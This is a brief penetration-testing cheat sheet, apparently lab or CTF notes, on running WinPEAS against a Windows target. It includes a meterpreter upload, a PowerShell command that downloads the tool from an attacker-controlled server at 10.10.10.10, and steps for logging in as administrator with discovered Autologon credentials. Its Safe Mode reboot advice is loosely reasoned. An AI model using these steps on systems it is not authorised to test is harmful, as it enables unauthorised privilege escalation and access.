# WinPeas
```
# Download it in your localhost
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220717/winPEASx64.exe 
mv winPEASx64.exe winPEAS.exe 

# in meterpreter
cd c:\windows\temp
upload winPeas.exe
winPeas.exe

# download via powershell and python server
powershell -command "Invoke-WebRequest -Uri 'http://10.10.10.10:8888/winPeas.exe' -OutFile '.\winPeas.exe'"
```


## WinPEAS


### Autologon Credentials was found

If you found Autologon credentials for the administrator user with the password 4q6XvFES7Fdxs using WinPeas, you can use these credentials to log in to the system as the administrator user.

To do so, you can reboot the system and press F8 during boot to enter the Windows Advanced Boot Options menu. From there, select "Safe Mode with Networking" to boot the system into Safe Mode with networking support.

Once you have booted into Safe Mode, you can use the administrator username and 4q6XvFES7Fdxs password to log in to the system. Once you are logged in, you will have administrative access to the system and can perform various tasks as necessary.
